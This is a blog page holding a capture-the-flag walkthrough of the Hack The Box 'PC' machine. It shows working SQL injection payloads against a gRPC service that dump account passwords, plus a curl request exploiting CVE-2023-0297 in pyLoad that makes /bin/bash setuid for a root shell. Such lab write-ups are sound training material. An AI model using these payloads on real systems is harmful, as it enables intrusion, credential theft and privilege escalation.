<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - PC Machine User flag Let&rsquo;s scan the network: ➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb
Which only reports port 22/tcp open:
➤ cat nmap-scan.nmap | ag open 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Let&rsquo;s try scanning all ports TCP and UDP:
-sS -p- pc.htb -sU -p- pc.htb I&rsquo;ve found this:
50051/tcp open unknown I don&rsquo;t get it yet, there is something on that 50051/tcp port:"><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - PC Machine User flag Let&rsquo;s scan the network: ➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb
Which only reports port 22/tcp open:
➤ cat nmap-scan.nmap | ag open 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Let&rsquo;s try scanning all ports TCP and UDP:
-sS -p- pc.htb -sU -p- pc.htb I&rsquo;ve found this:
50051/tcp open unknown I don&rsquo;t get it yet, there is something on that 50051/tcp port:"><meta property="og:title" content><meta property="og:description" content="easy - PC Machine User flag Let&rsquo;s scan the network: ➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb
Which only reports port 22/tcp open:
➤ cat nmap-scan.nmap | ag open 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) Let&rsquo;s try scanning all ports TCP and UDP:
-sS -p- pc.htb -sU -p- pc.htb I&rsquo;ve found this:
50051/tcp open unknown I don&rsquo;t get it yet, there is something on that 50051/tcp port:"><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/pc/"><meta property="article:section" content="infosec"><title>easy - PC Machine </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/pc/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---pc-machine>easy - PC Machine
<a class=heading-link href=#easy---pc-machine><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Let&rsquo;s scan the network:
<code>➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan pc.htb</code></p><p>Which only reports port 22/tcp open:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ cat nmap-scan.nmap | ag open
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span></code></pre></div><p>Let&rsquo;s try scanning all ports TCP and UDP:</p><ul><li>-sS -p- pc.htb</li><li>-sU -p- pc.htb</li></ul><p>I&rsquo;ve found this:</p><ul><li><code>50051/tcp open unknown</code></li></ul><p>I don&rsquo;t get it yet, there is something on that 50051/tcp port:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ echo wtf | nc pc.htb <span style=color:#0086f7;font-weight:700>50051</span>
</span></span><span style=display:flex><span>???%
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>➤ curl http://pc.htb:50051
</span></span><span style=display:flex><span>curl: (1) Received HTTP/0.9 when not allowed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>➤ curl -k https://pc.htb:50051
</span></span><span style=display:flex><span>curl: (35) OpenSSL/3.0.9: error:0A00010B:SSL routines::wrong version number
</span></span></code></pre></div><p>After a quick check in wikipedia, it seems that port 50051 is used by gRPC, so what is it?:</p><blockquote><p>gRPC (gRPC Remote Procedure Calls ) is a cross-platform open source high performance remote procedure call (RPC) framework. gRPC was initially created by Google, which used a single general-purpose RPC infrastructure called Stubby&mldr; It uses HTTP/2 for transport, &mldr;</p></blockquote><p>So lets get a client <code>grpc_cli</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Listing what we have in that service</span>
</span></span><span style=display:flex><span>➤ grpc_cli ls pc.htb:50051
</span></span><span style=display:flex><span>SimpleApp
</span></span><span style=display:flex><span>grpc.reflection.v1alpha.ServerReflection
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Listing what we have in SimpleApp:</span>
</span></span><span style=display:flex><span>➤ grpc_cli ls pc.htb:50051 SimpleApp -l
</span></span><span style=display:flex><span>filename: app.proto
</span></span><span style=display:flex><span>service SimpleApp {
</span></span><span style=display:flex><span>  rpc LoginUser(LoginUserRequest) returns (LoginUserResponse) {}
</span></span><span style=display:flex><span>  rpc RegisterUser(RegisterUserRequest) returns (RegisterUserResponse) {}
</span></span><span style=display:flex><span>  rpc getInfo(getInfoRequest) returns (getInfoResponse) {}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Checking RegisterUserRequest structure</span>
</span></span><span style=display:flex><span>➤ grpc_cli type pc.htb:50051 RegisterUserRequest
</span></span><span style=display:flex><span>message RegisterUserRequest {
</span></span><span style=display:flex><span>  string <span style=color:#fb660a>username</span> = 1;
</span></span><span style=display:flex><span>  string <span style=color:#fb660a>password</span> = 2;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Trying to register</span>
</span></span><span style=display:flex><span>➤ grpc_cli call pc.htb:50051 SimpleApp.RegisterUser <span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>connecting to pc.htb:50051
</span></span><span style=display:flex><span>message: <span style=color:#0086d2>&#34;username or password must be greater than 4&#34;</span>
</span></span><span style=display:flex><span>Rpc succeeded with OK status
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>➤ grpc_cli call pc.htb:50051 SimpleApp.RegisterUser <span style=color:#0086d2>&#39;username: &#34;foobar&#34;, password: &#34;foobar&#34;&#39;</span>
</span></span><span style=display:flex><span>connecting to pc.htb:50051
</span></span><span style=display:flex><span>message: <span style=color:#0086d2>&#34;Account created for user foobar!&#34;</span>
</span></span><span style=display:flex><span>Rpc succeeded with OK status
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Logging</span>
</span></span><span style=display:flex><span>➤ grpc_cli call pc.htb:50051 SimpleApp.LoginUser <span style=color:#0086d2>&#39;username: &#34;foobar&#34;, password: &#34;foobar&#34;&#39;</span>
</span></span><span style=display:flex><span>connecting to pc.htb:50051
</span></span><span style=display:flex><span>message: <span style=color:#0086d2>&#34;Your id is 732.&#34;</span>
</span></span><span style=display:flex><span>Received trailing metadata from server:
</span></span><span style=display:flex><span>token : b<span style=color:#0086d2>&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZm9vYmFyIiwiZXhwIjoxNjg2MzcwMjQ2fQ.VVFuG6VhJhRSeNJdckmOAtTdlOTjDzeNlQ3ri6rLt_A&#39;</span>
</span></span><span style=display:flex><span>Rpc succeeded with OK status
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Testing getInfo</span>
</span></span><span style=display:flex><span>➤ grpc_cli type pc.htb:50051 getInfoRequest
</span></span><span style=display:flex><span>message getInfoRequest {
</span></span><span style=display:flex><span>  string <span style=color:#fb660a>id</span> = 1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>➤ grpc_cli call pc.htb:50051 SimpleApp.getInfo <span style=color:#0086d2>&#39;id: &#34;732&#34;&#39;</span>
</span></span><span style=display:flex><span>connecting to pc.htb:50051
</span></span><span style=display:flex><span>message: <span style=color:#0086d2>&#34;Authorization Error.Missing \&#39;token\&#39; header&#34;</span>
</span></span><span style=display:flex><span>Rpc succeeded with OK status
</span></span></code></pre></div><p>Ok, so the deal is that <code>grpc_cli</code> doesnt&rsquo; support headers, we cannot set token, I already tried. Let&rsquo;s use a python client, but for that we need to get the <code>.proto</code> file for the service.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ grpcurl -plaintext pc.htb:50051 describe SimpleApp &gt; protos/SimpleApp.proto
</span></span><span style=display:flex><span>➤ file protos/SimpleApp.proto
</span></span><span style=display:flex><span>protos/SimpleApp.proto: ASCII text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># I had to modify it like this:</span>
</span></span><span style=display:flex><span>➤ cat protos/SimpleApp.proto
</span></span><span style=display:flex><span><span style=color:#fb660a>syntax</span> = <span style=color:#0086d2>&#34;proto3&#34;</span>;
</span></span><span style=display:flex><span>message getInfoRequest {
</span></span><span style=display:flex><span>  string <span style=color:#fb660a>id</span> = 1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>message getInfoResponse {
</span></span><span style=display:flex><span>  string <span style=color:#fb660a>message</span> = 1;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>service SimpleApp {
</span></span><span style=display:flex><span>  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>➤ python -m grpc_tools.protoc -I./protos --python_out=. --grpc_python_out=. ./protos/SimpleApp.proto
</span></span></code></pre></div><p>Up to this point I wanted to run a gRPC python client which was failing for me with multiple tries & configurations. After googling I&rsquo;ve found this tool <code>grpcui</code> which proxies this grpc http2 to a regular http browsing on your default webbrowser.</p><figure class=image-container><a href=/i/2023-06-09_21-57.png><img width=100% src=/i/2023-06-09_21-57.png alt="Browsing gRPC via web UI"></a><figcaption>&#8213; Browsing gRPC via web UI &#8213;</figcaption></figure><p>&mldr; and <code>curl</code> works now! &#x1f604;</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ curl -I <span style=color:#0086d2>&#39;http://127.0.0.1:45031/&#39;</span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Cache-Control: private, must-revalidate
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>7295</span>
</span></span><span style=display:flex><span>Content-Type: text/html; <span style=color:#fb660a>charset</span>=utf-8
</span></span><span style=display:flex><span>Etag: udpVnrYoZ_4aBEHdR5XGR3NBKthwmecSkANDb7yNGyM
</span></span><span style=display:flex><span>Set-Cookie: <span style=color:#fb660a>_grpcui_csrf_token</span>=idCj6O8TOcjLeSiX8ktXOifq_STTps1-PeGVHvbMT9U
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#0086f7;font-weight:700>10</span> Jun <span style=color:#0086f7;font-weight:700>2023</span> 01:59:45 GMT
</span></span></code></pre></div><p>I wanted to try to create an user foobar and explore from there but I tested that <code>admin:admin</code> are valid <strong>default</strong> credentials!!</p><p>So the problem is that this id changes over the time and also the token becames invalid, so I have to automate it to get a new fresh id and its token on each request. This time I will just work with <code>grpcurl</code>.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># The bash script</span>
</span></span><span style=display:flex><span>grpcurl <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -plaintext <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -d <span style=color:#0086d2>&#39;{&#34;id&#34;: &#34;512&#34;}&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -rpc-header <span style=color:#0086d2>&#39;token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODYzNzM2NTB9.kkejZIKZXMjf9PI1LfniU7PUwCPGWmDCJsNMml3TbWk&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  pc.htb:50051 SimpleApp.getInfo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#0086d2>&#34;message&#34;</span>: <span style=color:#0086d2>&#34;Will update soon.&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here the automated code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fb660a>response</span>=<span style=color:#fb660a;font-weight:700>$(</span> grpcurl -v -plaintext <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -d <span style=color:#0086d2>&#39;{&#34;username&#34;:&#34;admin&#34;, &#34;password&#34;:&#34;admin&#34;}&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  pc.htb:50051 SimpleApp.LoginUser | ag <span style=color:#0086d2>&#39;token|message&#39;</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>idnumber</span>=<span style=color:#fb660a;font-weight:700>$(</span>echo <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>response</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span> | sed <span style=color:#0086d2>&#39;s/token.*//&#39;</span> | sed -n <span style=color:#0086d2>&#39;s/[^0-9]*\([0-9]\+\).*/\1/p&#39;</span><span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>token</span>=<span style=color:#fb660a;font-weight:700>$(</span>echo <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>response</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span> | sed -n <span style=color:#0086d2>&#34;s/.*b&#39;\([^&#39;]*\)&#39;.*/\1/p&#34;</span><span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>payload</span>=<span style=color:#0086d2>&#39;{&#34;id&#34;:&#34;&#39;</span><span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>idnumber</span><span style=color:#0086d2>}</span><span style=color:#0086d2> UNION SELECT 12345&#34;</span><span style=color:#0086d2>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>grpcurl <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -plaintext <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -d <span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>payload</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  -rpc-header <span style=color:#0086d2>&#39;token: &#39;</span><span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>token</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>  pc.htb:50051 SimpleApp.getInfo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#0086d2>&#34;message&#34;</span>: <span style=color:#0086d2>&#34;12345&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>So now I will try different payloads:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Checking error info leak</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>payload</span>=<span style=color:#0086d2>&#39;{&#34;id&#34;:&#34;&#39;</span><span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>idnumber</span><span style=color:#0086d2>}</span><span style=color:#0086d2>; SELECT 0&#34;</span><span style=color:#0086d2>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>ERROR:
</span></span><span style=display:flex><span>  Code: Unknown
</span></span><span style=display:flex><span>  Message: Unexpected &lt;class <span style=color:#0086d2>&#39;sqlite3.Warning&#39;</span>&gt;: You can only execute one statement at a time.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Checking version</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>payload</span>=<span style=color:#0086d2>&#39;{&#34;id&#34;:&#34;&#39;</span><span style=color:#0086d2>&#34;</span><span style=color:#0086d2>${</span><span style=color:#fb660a>idnumber</span><span style=color:#0086d2>}</span><span style=color:#0086d2> UNION SELECT sqlite_version()&#34;</span><span style=color:#0086d2>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>{ <span style=color:#0086d2>&#34;message&#34;</span>: <span style=color:#0086d2>&#34;3.31.1&#34;</span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># SQLi-ing</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>payload</span>=<span style=color:#0086d2>&#39;{&#34;id&#34;:&#34;&#39;</span><span style=color:#0086d2>&#34;-1 union select group_concat(username) from accounts&#34;</span><span style=color:#0086d2>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>{ <span style=color:#0086d2>&#34;message&#34;</span>: <span style=color:#0086d2>&#34;admin,sau&#34;</span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>payload</span>=<span style=color:#0086d2>&#39;{&#34;id&#34;:&#34;&#39;</span><span style=color:#0086d2>&#34;-1 union select group_concat(password) from accounts&#34;</span><span style=color:#0086d2>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>{ <span style=color:#0086d2>&#34;message&#34;</span>: <span style=color:#0086d2>&#34;admin,HereIsYourPassWord1431&#34;</span> }
</span></span></code></pre></div><p>And we&rsquo;ve got sau&rsquo;s ssh access:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sau@pc:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(sau) <span style=color:#fb660a>gid</span>=1001(sau) <span style=color:#fb660a>groups</span>=1001(sau)
</span></span><span style=display:flex><span>sau@pc:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span></code></pre></div><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sau@pc:~$ sudo -l
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> sau:
</span></span><span style=display:flex><span>Sorry, user sau may not run sudo on localhost.
</span></span></code></pre></div><p>Checking network:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sau@pc:~$ netstat -tlpn | grep LISTEN
</span></span><span style=display:flex><span>(Not all processes could be identified, non-owned process info
</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.)
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp        <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> :::50051                :::*                    LISTEN      -
</span></span><span style=display:flex><span>tcp6       <span style=color:#0086f7;font-weight:700>0</span>      <span style=color:#0086f7;font-weight:700>0</span> :::22                   :::*                    LISTEN      -
</span></span></code></pre></div><p>That 8000/tcp is running a PyLoad app (SSH Proxy to your local is required here):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ curl -s -L http://localhost:8000 | ag pyload
</span></span><span style=display:flex><span>&lt;title&gt;Login - pyLoad &lt;/title&gt;
</span></span><span style=display:flex><span>      &lt;img <span style=color:#fb660a>alt</span>=<span style=color:#0086d2>&#34;Pyload&#34;</span> <span style=color:#fb660a>src</span>=<span style=color:#0086d2>&#34;/_themes/modern/img/pyload-logo.png&#34;</span>&gt;
</span></span></code></pre></div><p>&mldr; and as a magic I found a github repo created 5 months ago &#x1f604; <strong>CVE-2023-0297: Pre-auth RCE in pyLoad</strong>
<a href=https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad>https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad</a>
where PyLoad is using a vulnerable function <code>eval_js()</code> where we can send malicious payload remotely without authentication at all &#x1f604; - let&rsquo;s make /bin/bash suid.</p><p><code>chmod u+s /bin/bash</code> = <code>%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>curl -i -s -k -X <span style=color:#0086d2>$&#39;POST&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>    --data-binary <span style=color:#0086d2>$&#39;jk=pyimport%20os;os.system(\&#34;%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68\&#34;);f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>    <span style=color:#0086d2>$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
</span></span></code></pre></div><p>And voilá:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sau@pc:~$ ls -ltra /bin/bash
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>1183448</span> Apr <span style=color:#0086f7;font-weight:700>18</span>  <span style=color:#0086f7;font-weight:700>2022</span> /bin/bash
</span></span><span style=display:flex><span>sau@pc:~$ ls -ltra /bin/bash
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#0086f7;font-weight:700>1</span> root root <span style=color:#0086f7;font-weight:700>1183448</span> Apr <span style=color:#0086f7;font-weight:700>18</span>  <span style=color:#0086f7;font-weight:700>2022</span> /bin/bash
</span></span><span style=display:flex><span>sau@pc:~$ /bin/bash -p
</span></span><span style=display:flex><span>bash-5.0# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(sau) <span style=color:#fb660a>gid</span>=1001(sau) <span style=color:#fb660a>euid</span>=0(root) <span style=color:#fb660a>groups</span>=1001(sau)
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>